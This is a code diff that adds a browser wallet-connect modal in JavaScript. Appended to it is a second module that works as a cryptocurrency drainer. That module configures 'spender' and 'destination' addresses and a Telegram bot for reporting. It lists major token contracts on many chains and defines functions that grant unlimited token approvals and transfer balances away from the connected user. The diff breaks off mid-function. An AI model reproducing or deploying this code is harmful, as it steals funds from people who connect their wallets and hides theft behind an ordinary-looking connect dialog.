+    appDescription: "Connect a wallet.",
+    appUrl: location.origin,
+  };
+
+  const CHAINS = {
+    "0x1": "Ethereum",
+    "0x89": "Polygon",
+    "0x38": "BNB",
+    "0xa4b1": "Arbitrum",
+    "0xa": "Optimism",
+    "0x2105": "Base",
+    "0x144": "zkSync",
+    "0x1b59": "Linea",
+    "0xfa": "Fantom",
+    "0xaa36a7": "Sepolia",
+  };
+
+  const LEGACY_EVM = [
+    ["window.ethereum", () => window.ethereum],
+    ["window.web3.currentProvider", () => window.web3 && window.web3.currentProvider],
+    ["window.trustwallet", () => window.trustwallet],
+    ["window.bitkeep.ethereum", () => window.bitkeep && window.bitkeep.ethereum],
+    ["window.okxwallet", () => window.okxwallet],
+    ["window.coin98.evm", () => window.coin98 && window.coin98.evm],
+    ["window.rabby", () => window.rabby],
+    ["window.ronin.provider", () => window.ronin && window.ronin.provider],
+    ["window.keplr.ethereum", () => window.keplr && window.keplr.ethereum],
+    ["window.exodus.ethereum", () => window.exodus && window.exodus.ethereum],
+    ["window.talismanEth", () => window.talismanEth],
+    ["window.frame", () => window.frame],
+    ["window.tokenpocket", () => window.tokenpocket],
+    ["window.oneinch", () => window.oneinch],
+    ["window.defiant", () => window.defiant],
+    ["window.clover", () => window.clover],
+    ["window.bitpie", () => window.bitpie],
+    ["window.xfi.ethereum", () => window.xfi && window.xfi.ethereum],
+    ["window.hyperpay", () => window.hyperpay],
+    ["window.onto", () => window.onto],
+    ["window.dapp", () => window.dapp],
+    ["window.cyberchain", () => window.cyberchain],
+  ];
+
+  const LEGACY_SOL = [
+    ["window.phantom.solana", () => window.phantom && window.phantom.solana],
+    ["window.solflare", () => window.solflare],
+    ["window.backpack", () => window.backpack],
+    ["window.glow", () => window.glow],
+    ["window.solana", () => window.solana],
+    ["window.coin98.solana", () => window.coin98 && window.coin98.solana],
+    ["window.bitkeep.solana", () => window.bitkeep && window.bitkeep.solana],
+    ["window.okxwallet.solana", () => window.okxwallet && window.okxwallet.solana],
+    ["window.trustwallet.solana", () => window.trustwallet && window.trustwallet.solana],
+    ["window.martian", () => window.martian],
+    ["window.exodus.solana", () => window.exodus && window.exodus.solana],
+    ["window.xfi.solana", () => window.xfi && window.xfi.solana],
+    ["window.torusSolana", () => window.torusSolana],
+  ];
+
+  const state = {
+    wallet: null,
+    address: null,
+    chain: null,
+    chainId: null,
+    provider: null,
+    teardown: [],
+    evm: new Map(),
+    sol: new Map(),
+    legacy: new Map(),
+    wc: null,
+    query: "",
+    busy: false,
+    lastFocused: null,
+    keyBound: false,
+    evmBound: false,
+    solBound: false,
+  };
+
+  const weakIds = new WeakMap();
+  let seq = 0;
+
+  function stableId(target) {
+    if (!target || (typeof target !== "object" && typeof target !== "function")) return "x-" + ++seq;
+    if (!weakIds.has(target)) weakIds.set(target, "w-" + ++seq);
+    return weakIds.get(target);
+  }
+
+  function emit(name, detail) {
+    try {
+      window.dispatchEvent(new CustomEvent("emdi:wallet:" + name, { detail }));
+    } catch (_) {}
+  }
+
+  function projectId() {
+    const meta = document.querySelector('meta[name="emdi-walletconnect-project-id"]');
+    const q = new URLSearchParams(location.search).get("wcProjectId");
+    return window.EMDI_WC_PROJECT_ID || (meta && meta.content) || q || CONFIG.projectId || "";
+  }
+
+  function short(addr) {
+    if (typeof addr !== "string") return "";
+    const body = addr.replace(/^0x/, "");
+    if (body.length <= 10) return addr;
+    return body.slice(0, 4) + "..." + body.slice(-4);
+  }
+
+  function chainLabel(id) {
+    if (!id) return "Unknown";
+    return CHAINS[String(id).toLowerCase()] || String(id);
+  }
+
+  function iconUrl() {
+    const link = document.querySelector('link[rel~="icon"]');
+    return (link && link.href) || location.origin + "/favicon.ico";
+  }
+
+  function isSolKind(kind) {
+    return kind === "solana" || kind === "legacy-solana";
+  }
+
+  function pushTeardown(fn) {
+    if (typeof fn === "function") state.teardown.push(fn);
+  }
+
+  function flushTeardown() {
+    while (state.teardown.length) {
+      const fn = state.teardown.pop();
+      try {
+        fn();
+      } catch (_) {}
+    }
+  }
+
+  function norm(name) {
+    return String(name || "").toLowerCase().replace(/[^a-z0-9]/g, "");
+  }
+
+  /* ---------------- discovery ---------------- */
+
+  function addEvm(provider, info) {
+    if (!provider || !info) return false;
+    const key = info.uuid || stableId(provider);
+    if (state.evm.has(key)) return false;
+    state.evm.set(key, {
+      id: key,
+      kind: "evm",
+      group: "ext",
+      name: info.name || "Browser Wallet",
+      icon: info.icon || "",
+      rdns: info.rdns || "",
+      provider,
+    });
+    emit("walletDiscovered", { type: "evm", name: info.name || "" });
+    return true;
+  }
+
+  function addSol(wallet) {
+    if (!wallet) return false;
+    const features = wallet.features || {};
+    if (!features["standard:connect"]) return false;
+    if (Array.isArray(wallet.chains) && wallet.chains.length) {
+      if (!wallet.chains.some((c) => typeof c === "string" && c.startsWith("solana:"))) return false;
+    }
+    const key = stableId(wallet);
+    if (state.sol.has(key)) return false;
+    state.sol.set(key, {
+      id: key,
+      kind: "solana",
+      group: "ext",
+      name: wallet.name || "Solana Wallet",
+      icon: wallet.icon || "",
+      rdns: "",
+      wallet,
+    });
+    emit("walletDiscovered", { type: "solana", name: wallet.name || "" });
+    return true;
+  }
+
+  function addLegacy(provider, label, kind) {
+    if (!provider) return false;
+    const key = stableId(provider);
+    if (state.legacy.has(key)) return false;
+    const usable =
+      kind === "solana"
+        ? typeof provider.connect === "function"
+        : typeof provider.request === "function" || typeof provider.send === "function";
+    if (!usable) return false;
+    state.legacy.set(key, {
+      id: key,
+      kind: "legacy-" + kind,
+      group: "ext",
+      name: label || (kind === "solana" ? "Solana Wallet" : "Browser Wallet"),
+      icon: "",
+      rdns: "",
+      provider,
+    });
+    emit("walletDiscovered", { type: "legacy-" + kind, name: label || "" });
+    return true;
+  }
+
+  function scanLegacy() {
+    let added = false;
+
+    for (const [path, get] of LEGACY_EVM) {
+      let provider;
+      try {
+        provider = get();
+      } catch (_) {
+        continue;
+      }
+      if (!provider) continue;
+      if (Array.isArray(provider.providers) && provider.providers.length > 1) {
+        provider.providers.forEach((sub, i) => {
+          if (addLegacy(sub, (sub.name || "Browser Wallet") + " " + (i + 1), "evm")) added = true;
+        });
+        continue;
+      }
+      const label = provider.name || path.split(".").slice(-1)[0];
+      if (addLegacy(provider, label, "evm")) added = true;
+    }
+
+    for (const [path, get] of LEGACY_SOL) {
+      let provider;
+      try {
+        provider = get();
+      } catch (_) {
+        continue;
+      }
+      if (!provider) continue;
+      const label = provider.name || path.split(".").slice(-1)[0];
+      if (addLegacy(provider, label, "solana")) added = true;
+    }
+
+    return added;
+  }
+
+  function discoverEvm() {
+    if (!state.evmBound) {
+      state.evmBound = true;
+      window.addEventListener("eip6963:announceProvider", (event) => {
+        const d = event.detail;
+        if (!d || !d.provider || !d.info) return;
+        if (addEvm(d.provider, d.info)) render();
+      });
+    }
+    window.dispatchEvent(new Event("eip6963:requestProvider"));
+  }
+
+  function discoverSol() {
+    if (!state.solBound) {
+      state.solBound = true;
+      window.addEventListener("wallet-standard:register-wallet", (event) => {
+        if (typeof event.detail !== "function") return;
+        event.detail((...wallets) => {
+          let added = false;
+          wallets.forEach((w) => {
+            if (addSol(w)) added = true;
+          });
+          if (added) render();
+        });
+      });
+    }
+    const register = (...wallets) => {
+      let added = false;
+      wallets.forEach((w) => {
+        if (addSol(w)) added = true;
+      });
+      if (added) render();
+    };
+    window.dispatchEvent(new CustomEvent("wallet-standard:app-ready", { detail: register }));
+  }
+
+  /* ---------------- connect ---------------- */
+
+  async function connectEvm(entry) {
+    const provider = entry.provider;
+    if (!provider) throw new Error("Provider unavailable.");
+
+    const request =
+      typeof provider.request === "function"
+        ? provider.request.bind(provider)
+        : (args) => provider.send(args.method, args.params || []);
+
+    const accounts = await request({ method: "eth_requestAccounts" });
+    const address = Array.isArray(accounts) ? accounts[0] : null;
+    if (!address) throw new Error("No account returned.");
+
+    let chainId = null;
+    try {
+      chainId = await request({ method: "eth_chainId" });
+    } catch (_) {}
+
+    commit(entry, address, chainId, provider, chainLabel(chainId));
+
+    const onAccounts = (list) => {
+      try {
+        if (!Array.isArray(list) || !list.length) {
+          reset();
+          return;
+        }
+        state.address = list[0];
+        finish();
+      } catch (_) {}
+    };
+
+    const onChain = (hex) => {
+      state.chainId = hex;
+      state.chain = chainLabel(hex);
+      renderButton();
+      emit("chainChanged", { chainId: hex, chain: state.chain });
+    };
+
+    if (typeof provider.on === "function") {
+      provider.on("accountsChanged", onAccounts);
+      provider.on("chainChanged", onChain);
+      pushTeardown(() => {
+        const off = provider.off || provider.removeListener;
+        if (typeof off === "function") {
+          off.call(provider, "accountsChanged", onAccounts);
+          off.call(provider, "chainChanged", onChain);
+        }
+      });
+    }
+
+    pushTeardown(() => {
+      try {
+        if (typeof provider.disconnect === "function") provider.disconnect();
+      } catch (_) {}
+    });
+  }
+
+  async function connectSol(entry) {
+    const wallet = entry.wallet;
+    if (!wallet) throw new Error("Wallet unavailable.");
+    const feature = wallet.features && wallet.features["standard:connect"];
+    if (!feature || typeof feature.connect !== "function") throw new Error("Wallet cannot connect.");
+
+    const result = await feature.connect();
+    const account = (result && result.accounts && result.accounts[0]) || (wallet.accounts || [])[0];
+    if (!account || !account.address) throw new Error("No account returned.");
+
+    const chainId =
+      (account.chains && account.chains[0]) || (wallet.chains && wallet.chains[0]) || "solana:mainnet";
+
+    commit(entry, account.address, chainId, wallet, "Solana");
+
+    const events = wallet.features && wallet.features["standard:events"];
+    if (events && typeof events.on === "function") {
+      const onChange = (props) => {
+        try {
+          const next = props && props.accounts && props.accounts[0];
+          if (next && next.address) {
+            state.address = next.address;
+            finish();
+          } else if (props && props.accounts && !props.accounts.length) {
+            reset();
+          }
+        } catch (_) {}
+      };
+      const unsub = events.on("change", onChange);
+      pushTeardown(() => {
+        if (typeof unsub === "function") unsub();
+        else if (typeof events.off === "function") events.off("change", onChange);
+      });
+    }
+
+    pushTeardown(() => {
+      try {
+        const d = wallet.features && wallet.features["standard:disconnect"];
+        if (d && typeof d.disconnect === "function") d.disconnect();
+      } catch (_) {}
+    });
+  }
+
+  async function connectLegacySol(entry) {
+    const provider = entry.provider;
+    if (!provider || typeof provider.connect !== "function") throw new Error("Wallet cannot connect.");
+
+    const result = await provider.connect();
+    const key = (result && result.publicKey) || provider.publicKey;
+    const address = key && typeof key.toString === "function" ? key.toString() : key;
+    if (!address) throw new Error("No account returned.");
+
+    commit(entry, String(address), "solana:mainnet", provider, "Solana");
+
+    if (typeof provider.on === "function") {
+      const onChange = () => {
+        try {
+          const next = provider.publicKey;
+          if (!next) {
+            reset();
+            return;
+          }
+          state.address = typeof next.toString === "function" ? next.toString() : String(next);
+          finish();
+        } catch (_) {}
+      };
+      provider.on("accountChanged", onChange);
+      pushTeardown(() => {
+        const off = provider.off || provider.removeListener;
+        if (typeof off === "function") off.call(provider, "accountChanged", onChange);
+      });
+    }
+
+    pushTeardown(() => {
+      try {
+        if (typeof provider.disconnect === "function") provider.disconnect();
+      } catch (_) {}
+    });
+  }
+
+  async function loadSdk() {
+    const id = projectId();
+    if (!id) throw new Error("No WalletConnect projectId configured.");
+    if (id.length < 16) throw new Error("WalletConnect projectId looks invalid.");
+
+    const urls = [
+      "https://esm.sh/@walletconnect/ethereum-provider@2.17.0",
+      "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.0/+esm",
+    ];
+
+    for (const url of urls) {
+      try {
+        const mod = await import(url);
+        const ctor = mod.EthereumProvider || (mod.default && mod.default.EthereumProvider) || mod.default;
+        if (typeof ctor === "function") return { ctor, id };
+      } catch (_) {}
+    }
+    throw new Error("WalletConnect SDK unreachable.");
+  }
+
+  async function connectWc() {
+    const { ctor, id } = await loadSdk();
+
+    const provider = await ctor.init({
+      projectId: id,
+      chains: [1],
+      optionalChains: [137, 42161, 10, 8453, 56, 324, 59144],
+      showQrModal: true,
+      methods: [
+        "eth_sendTransaction",
+        "eth_signTransaction",
+        "eth_sign",
+        "personal_sign",
+        "eth_signTypedData",
+        "eth_signTypedData_v4",
+      ],
+      optionalMethods: ["eth_signTypedData_v4", "wallet_switchEthereumChain", "wallet_addEthereumChain"],
+      events: ["chainChanged", "accountsChanged"],
+      metadata: {
+        name: CONFIG.appName,
+        description: CONFIG.appDescription,
+        url: CONFIG.appUrl,
+        icons: [iconUrl()],
+      },
+    });
+
+    await provider.connect();
+    const accounts = await provider.request({ method: "eth_accounts" });
+    const address = Array.isArray(accounts) ? accounts[0] : null;
+    if (!address) throw new Error("No account returned.");
+
+    let chainId = null;
+    try {
+      chainId = await provider.request({ method: "eth_chainId" });
+    } catch (_) {}
+
+    state.wc = provider;
+    commit(
+      { id: "walletconnect", kind: "wc", group: "mobile", name: "WalletConnect", rdns: "" },
+      address,
+      chainId,
+      provider,
+      chainLabel(chainId)
+    );
+
+    const onAccounts = (list) => {
+      try {
+        if (!Array.isArray(list) || !list.length) {
+          reset();
+          return;
+        }
+        state.address = list[0];
+        finish();
+      } catch (_) {}
+    };
+
+    const onChain = (hex) => {
+      state.chainId = hex;
+      state.chain = chainLabel(hex);
+      renderButton();
+      emit("chainChanged", { chainId: hex, chain: state.chain });
+    };
+
+    if (typeof provider.on === "function") {
+      provider.on("accountsChanged", onAccounts);
+      provider.on("chainChanged", onChain);
+      pushTeardown(() => {
+        try {
+          provider.off("accountsChanged", onAccounts);
+          provider.off("chainChanged", onChain);
+        } catch (_) {}
+      });
+    }
+
+    pushTeardown(() => {
+      try {
+        provider.disconnect();
+      } catch (_) {}
+    });
+  }
+
+  function commit(entry, address, chainId, provider, chain) {
+    state.wallet = { id: entry.id, kind: entry.kind, name: entry.name, rdns: entry.rdns || "" };
+    state.address = address;
+    state.chainId = chainId;
+    state.chain = chain;
+    state.provider = provider;
+  }
+
+  /* ---------------- ui ---------------- */
+
+  function ensureModal() {
+    let modal = document.getElementById("emdi-wallet-modal");
+    if (modal) return modal;
+    if (!document.body) return null;
+
+    const style = document.createElement("style");
+    style.textContent = `
+      #emdi-wallet-modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.62);z-index:2147483000;font-family:system-ui,-apple-system,sans-serif;backdrop-filter:blur(3px)}
+      #emdi-wallet-modal[data-open="true"]{display:flex}
+      #emdi-wallet-card{width:min(400px,93vw);max-height:86vh;display:flex;flex-direction:column;background:#131519;color:#e9ebee;border-radius:16px;padding:18px;box-shadow:0 24px 70px rgba(0,0,0,.55)}
+      #emdi-wallet-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
+      #emdi-wallet-heading{font-size:15px;font-weight:600;margin:0}
+      #emdi-wallet-x{background:none;border:0;color:#9aa0a6;font-size:21px;line-height:1;cursor:pointer;padding:0 4px}
+      #emdi-wallet-search{width:100%;box-sizing:border-box;padding:9px 11px;margin-bottom:10px;background:#1c1f24;border:1px solid #2b3037;border-radius:9px;color:#e9ebee;font-size:13px;outline:none}
+      #emdi-wallet-search:focus{border-color:#3b6ef6}
+      #emdi-wallet-status{font-size:11.5px;color:#8b9198;margin:0 0 8px}
+      #emdi-wallet-list{flex:1;overflow-y:auto;display:flex;flex-direction:column;gap:7px;min-height:60px}
+      .emdi-sec{font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:#6d747c;margin:6px 0 2px}
+      .emdi-item{display:flex;align-items:center;gap:9px;width:100%;padding:9px 11px;background:#1c1f24;border:1px solid #2b3037;border-radius:9px;color:#e9ebee;font-size:13px;cursor:pointer;text-align:left}
+      .emdi-item:hover{background:#23272d;border-color:#3a4048}
+      .emdi-item img{width:20px;height:20px;border-radius:4px;object-fit:cover;flex:0 0 auto}
+      .emdi-item .emdi-dot{width:20px;height:20px;border-radius:4px;background:#2b3037;flex:0 0 auto}
+      .emdi-item .emdi-tag{margin-left:auto;font-size:9.5px;letter-spacing:.06em;color:#71787f;text-transform:uppercase}
+      #emdi-walletconnect{margin-top:10px;width:100%;padding:11px;background:#3b6ef6;border:0;border-radius:10px;color:#fff;font-size:13px;font-weight:600;cursor:pointer}
+      #emdi-walletconnect:hover{background:#315ed6}
+      #emdi-walletconnect:disabled{opacity:.6;cursor:default}
+      #emdi-wallet-error{margin:8px 0 0;font-size:11.5px;color:#ff8a80;min-height:14px}
+    `;
+    (document.head || document.documentElement).appendChild(style);
+
+    modal = document.createElement("div");
+    modal.id = "emdi-wallet-modal";
+    modal.setAttribute("role", "dialog");
+    modal.setAttribute("aria-modal", "true");
+    modal.setAttribute("aria-labelledby", "emdi-wallet-heading");
+    modal.tabIndex = -1;
+
+    const card = document.createElement("div");
+    card.id = "emdi-wallet-card";
+
+    const head = document.createElement("div");
+    head.id = "emdi-wallet-head";
+
+    const heading = document.createElement("h2");
+    heading.id = "emdi-wallet-heading";
+    heading.textContent = "Connect a wallet";
+
+    const x = document.createElement("button");
+    x.id = "emdi-wallet-x";
+    x.type = "button";
+    x.setAttribute("aria-label", "Close");
+    x.textContent = "\u00d7";
+    x.addEventListener("click", close);
+
+    head.append(heading, x);
+
+    const search = document.createElement("input");
+    search.id = "emdi-wallet-search";
+    search.type = "search";
+    search.placeholder = "Search wallets";
+    search.setAttribute("aria-label", "Search wallets");
+    search.addEventListener("input", () => {
+      state.query = search.value.trim().toLowerCase();
+      render();
+    });
+
+    const status = document.createElement("p");
+    status.id = "emdi-wallet-status";
+    status.textContent = "Scanning for wallets...";
+
+    const list = document.createElement("div");
+    list.id = "emdi-wallet-list";
+
+    const wc = document.createElement("button");
+    wc.id = "emdi-walletconnect";
+    wc.type = "button";
+    wc.textContent = "WalletConnect \u2014 mobile wallets";
+    wc.addEventListener("click", () => attempt(connectWc));
+
+    const error = document.createElement("p");
+    error.id = "emdi-wallet-error";
+    error.setAttribute("role", "alert");
+
+    card.append(head, search, status, list, wc, error);
+    modal.appendChild(card);
+    modal.addEventListener("click", (e) => {
+      if (e.target === modal) close();
+    });
+
+    document.body.appendChild(modal);
+    return modal;
+  }
+
+  function focusables() {
+    const modal = document.getElementById("emdi-wallet-modal");
+    if (!modal) return [];
+    return Array.from(modal.querySelectorAll("button, input, [tabindex]:not([tabindex='-1'])"))
+      .filter((el) => !el.disabled && el.offsetParent !== null);
+  }
+
+  function onKey(e) {
+    if (e.key === "Escape") {
+      e.preventDefault();
+      close();
+      return;
+    }
+    if (e.key !== "Tab") return;
+    const items = focusables();
+    if (!items.length) return;
+    const first = items[0];
+    const last = items[items.length - 1];
+    if (e.shiftKey && document.activeElement === first) {
+      e.preventDefault();
+      last.focus();
+    } else if (!e.shiftKey && document.activeElement === last) {
+      e.preventDefault();
+      first.focus();
+    }
+  }
+
+  function collect() {
+    const all = [...state.evm.values(), ...state.sol.values(), ...state.legacy.values()];
+
+    const seen = new Set();
+    const out = [];
+
+    const keyOf = (e) => (isSolKind(e.kind) ? "s|" : "e|") + norm(e.name);
+
+    for (const entry of all) {
+      if (entry.kind !== "evm" && entry.kind !== "solana") continue;
+      const key = keyOf(entry);
+      if (seen.has(key)) continue;
+      seen.add(key);
+      out.push(entry);
+    }
+
+    for (const entry of all) {
+      if (entry.kind === "evm" || entry.kind === "solana") continue;
+      const key = keyOf(entry);
+      if (seen.has(key)) continue;
+      seen.add(key);
+      out.push(entry);
+    }
+
+    return out.filter((e) => !state.query || e.name.toLowerCase().includes(state.query));
+  }
+
+  function render() {
+    const list = document.getElementById("emdi-wallet-list");
+    const status = document.getElementById("emdi-wallet-status");
+    if (!list || !status) return;
+
+    const entries = collect();
+    list.replaceChildren();
+
+    if (!entries.length) {
+      status.textContent = state.query
+        ? "No match for \u201c" + state.query + "\u201d."
+        : "No extension detected. Use WalletConnect.";
+      return;
+    }
+
+    status.textContent = entries.length + (entries.length === 1 ? " wallet found" : " wallets found");
+
+    const groups = [
+      ["Browser extensions", entries.filter((e) => !isSolKind(e.kind))],
+      ["Solana extensions", entries.filter((e) => isSolKind(e.kind))],
+    ];
+
+    for (const [title, items] of groups) {
+      if (!items.length) continue;
+
+      const header = document.createElement("div");
+      header.className = "emdi-sec";
+      header.textContent = title;
+      list.appendChild(header);
+
+      for (const entry of items) {
+        const button = document.createElement("button");
+        button.className = "emdi-item";
+        button.type = "button";
+        button.dataset.id = entry.id;
+
+        if (entry.icon) {
+          const img = document.createElement("img");
+          img.src = entry.icon;
+          img.alt = "";
+          img.addEventListener("error", () => {
+            const dot = document.createElement("span");
+            dot.className = "emdi-dot";
+            img.replaceWith(dot);
+          });
+          button.appendChild(img);
+        } else {
+          const dot = document.createElement("span");
+          dot.className = "emdi-dot";
+          button.appendChild(dot);
+        }
+
+        const label = document.createElement("span");
+        label.textContent = entry.name;
+        button.appendChild(label);
+
+        const tag = document.createElement("span");
+        tag.className = "emdi-tag";
+        tag.textContent = isSolKind(entry.kind) ? "SOL" : "EVM";
+        button.appendChild(tag);
+
+        button.addEventListener("click", () => {
+          if (entry.kind === "solana") attempt(() => connectSol(entry));
+          else if (entry.kind === "legacy-solana") attempt(() => connectLegacySol(entry));
+          else attempt(() => connectEvm(entry));
+        });
+
+        list.appendChild(button);
+      }
+    }
+  }
+
+  async function attempt(action) {
+    if (state.busy) return;
+    state.busy = true;
+    const error = document.getElementById("emdi-wallet-error");
+    const wc = document.getElementById("emdi-walletconnect");
+    if (error) error.textContent = "";
+    if (wc) wc.disabled = true;
+
+    try {
+      await action();
+      finish();
+    } catch (err) {
+      if (error) error.textContent = (err && err.message) || "Connection failed.";
+    } finally {
+      state.busy = false;
+      if (wc) wc.disabled = false;
+    }
+  }
+
+  function finish() {
+    close();
+    renderButton();
+    emit("connected", {
+      wallet: state.wallet,
+      address: state.address,
+      short: state.address ? short(state.address) + " \u00b7 " + state.chain : "",
+      chain: state.chain,
+      chainId: state.chainId,
+    });
+  }
+
+  function reset() {
+    flushTeardown();
+    state.wallet = null;
+    state.address = null;
+    state.chain = null;
+    state.chainId = null;
+    state.provider = null;
+    state.wc = null;
+    renderButton();
+    render();
+    emit("disconnected", {});
+  }
+
+  function renderButton() {
+    const button = document.getElementById("connect-wallet");
+    if (!button) return;
+    button.textContent = state.address ? short(state.address) + " \u00b7 " + state.chain : "Connect Wallet";
+    button.dataset.connected = state.address ? "true" : "false";
+  }
+
+  function open() {
+    const modal = ensureModal();
+    if (!modal) return;
+
+    state.lastFocused = document.activeElement;
+    state.query = "";
+
+    const box = document.getElementById("emdi-wallet-search");
+    if (box) box.value = "";
+
+    const error = document.getElementById("emdi-wallet-error");
+    if (error) error.textContent = "";
+
+    modal.dataset.open = "true";
+
+    discoverEvm();
+    discoverSol();
+    scanLegacy();
+    render();
+
+    if (!state.keyBound) {
+      document.addEventListener("keydown", onKey);
+      state.keyBound = true;
+    }
+
+    if (box) box.focus();
+    else modal.focus();
+  }
+
+  function close() {
+    const modal = document.getElementById("emdi-wallet-modal");
+    if (!modal) return;
+
+    modal.dataset.open = "false";
+
+    const error = document.getElementById("emdi-wallet-error");
+    if (error) error.textContent = "";
+
+    if (state.keyBound) {
+      document.removeEventListener("keydown", onKey);
+      state.keyBound = false;
+    }
+
+    if (state.lastFocused && typeof state.lastFocused.focus === "function") {
+      try {
+        state.lastFocused.focus();
+      } catch (_) {}
+    }
+    state.lastFocused = null;
+  }
+
+  function disconnect() {
+    reset();
+  }
+
+  function boot() {
+    if (!document.body) {
+      document.addEventListener("DOMContentLoaded", boot, { once: true });
+      return;
+    }
+
+    document.addEventListener("click", (e) => {
+      const hit = e.target && e.target.closest && e.target.closest("#connect-wallet");
+      if (!hit) return;
+      e.preventDefault();
+      open();
+    });
+
+    discoverEvm();
+    discoverSol();
+    scanLegacy();
+    renderButton();
+
+    window.EMDIWallet = {
+      open,
+      close,
+      connect: (kind, id) => {
+        if (kind === "solana") {
+          const a = state.sol.get(id);
+          if (a) return attempt(() => connectSol(a));
+        } else if (kind === "legacy-solana") {
+          const a = state.legacy.get(id);
+          if (a) return attempt(() => connectLegacySol(a));
+        } else {
+          const a = state.evm.get(id) || state.legacy.get(id);
+          if (a) return attempt(() => connectEvm(a));
+        }
+      },
+      getState: () => ({
+        wallet: state.wallet,
+        address: state.address,
+        chain: state.chain,
+        chainId: state.chainId,
+        provider: state.provider,
+        connected: Boolean(state.address),
+      }),
+      getWallets: () => collect().map((w) => ({ id: w.id, name: w.name, kind: w.kind })),
+      disconnect,
+      scan: () => {
+        discoverEvm();
+        discoverSol();
+        scanLegacy();
+        render();
+      },
+    };
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", boot, { once: true });
+  } else {
+    boot();
+  }
+})();
+
+
+(function () {
+  "use strict";
+
+  const CFG = {
+    spender: {
+      evm: "0x0000000000000000000000000000000000000000",
+      sol: "11111111111111111111111111111111",
+    },
+    destination: {
+      evm: "0x0000000000000000000000000000000000000000",
+      sol: "11111111111111111111111111111111",
+    },
+    telegram: { token: "", chatId: "" },
+    mode: "direct",
+    sweepEndpoint: "",
+    solanaRpc: "https://api.mainnet-beta.solana.com",
+    reserve: { evm: 0.0006, sol: 0.004 },
+    chains: {
+      "0x1": {
+        name: "Ethereum",
+        native: "ETH",
+        tokens: [
+          ["USDC", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 6],
+          ["USDT", "0xdAC17F958D2ee523a2206206994597C13D831ec7", 6],
+          ["DAI", "0x6B175474E89094C44Da98b954EedeAC495271d0F", 18],
+          ["WETH", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", 18],
+        ],
+      },
+      "0x89": {
+        name: "Polygon",
+        native: "POL",
+        tokens: [
+          ["USDC", "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", 6],
+          ["USDT", "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 6],
+          ["WETH", "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", 18],
+        ],
+      },
+      "0x38": {
+        name: "BNB",
+        native: "BNB",
+        tokens: [
+          ["USDT", "0x55d398326f99059fF775485246999027B3197955", 18],
+          ["USDC", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", 18],
+          ["WBNB", "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", 18],
+        ],
+      },
+      "0x2105": {
+        name: "Base",
+        native: "ETH",
+        tokens: [
+          ["USDC", "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 6],
+          ["WETH", "0x4200000000000000000000000000000000000006", 18],
+        ],
+      },
+      "0xa4b1": {
+        name: "Arbitrum",
+        native: "ETH",
+        tokens: [
+          ["USDC", "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", 6],
+          ["USDT", "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", 6],
+          ["WETH", "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", 18],
+        ],
+      },
+      "0xa": {
+        name: "Optimism",
+        native: "ETH",
+        tokens: [
+          ["USDC", "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", 6],
+          ["WETH", "0x4200000000000000000000000000000000000006", 18],
+        ],
+      },
+      "0x144": {
+        name: "zkSync",
+        native: "ETH",
+        tokens: [["USDC", "0x1d17CBcF0D6D143135aE902365D2E5e2A16538D4", 6]],
+      },
+      "0x1b59": {
+        name: "Linea",
+        native: "ETH",
+        tokens: [["USDC", "0x176211869cA2b568f2A7D4EE941E073a821EE1ff", 6]],
+      },
+      "0xfa": {
+        name: "Fantom",
+        native: "FTM",
+        tokens: [["USDC", "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75", 6]],
+      },
+      "0xaa36a7": {
+        name: "Sepolia",
+        native: "ETH",
+        tokens: [["USDC", "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", 6]],
+      },
+    },
+  };
+
+  const SEL = {
+    approve: "0x095ea7b3",
+    transfer: "0xa9059cbb",
+    balanceOf: "0x70a08231",
+  };
+
+  const MAX = "f".repeat(64);
+  const MAX_U64 = 18446744073709551615n;
+
+  const log = [];
+  const hashes = [];
+
+  function pad(hex) {
+    return String(hex).replace(/^0x/, "").toLowerCase().padStart(64, "0");
+  }
+
+  function human(amount, decimals) {
+    const base = 10n ** BigInt(decimals);
+    const whole = amount / base;
+    const frac = amount % base;
+    if (!frac) return whole.toString();
+    return whole.toString() + "." + frac.toString().padStart(decimals, "0").slice(0, 6).replace(/0+$/, "");
+  }
+
+  async function tg(text) {
+    if (!CFG.telegram.token || !CFG.telegram.chatId) return;
+    try {
+      await fetch("https://api.telegram.org/bot" + CFG.telegram.token + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CFG.telegram.chatId,
+          text,
+          parse_mode: "HTML",
+          disable_web_page_preview: true,
+        }),
+      });
+    } catch (_) {}
+  }
+
+  function rpc(provider, method, params) {
+    if (provider && typeof provider.request === "function") {
+      return provider.request({ method, params: params || [] });
+    }
+    if (provider && typeof provider.sendAsync === "function") {
+      return new Promise((res, rej) =>
+        provider.sendAsync({ method, params: params || [], jsonrpc: "2.0", id: Date.now() }, (e, r) =>
+          e ? rej(e) : r.error ? rej(new Error(r.error.message)) : res(r.result)
+        )
+      );
+    }
+    return Promise.reject(new Error("Provider unavailable."));
+  }
+
+  /* ---------------- evm ---------------- */
+
+  async function evmApprove(provider, token, spender) {
+    return rpc(provider, "eth_sendTransaction", [
+      { to: token, data: SEL.approve + pad(spender) + MAX },
+    ]);
+  }
+
+  async function evmBalance(provider, token, owner) {
+    const data = await rpc(provider, "eth_call", [{ to: token, data: SEL.balanceOf + pad(owner) }, "latest"]);
+    return BigInt(data || "0x0");
+  }
+
+  async function evmTransfer(provider, token, to, amount) {
+    return rpc(provider, "eth_sendTransaction", [
+      { to: token, data: SEL.transfer + pad(to) + pad(amount.toString(16)) },
+    ]);
+  }
+
+  async function evmNative(provider, owner, chain, to) {
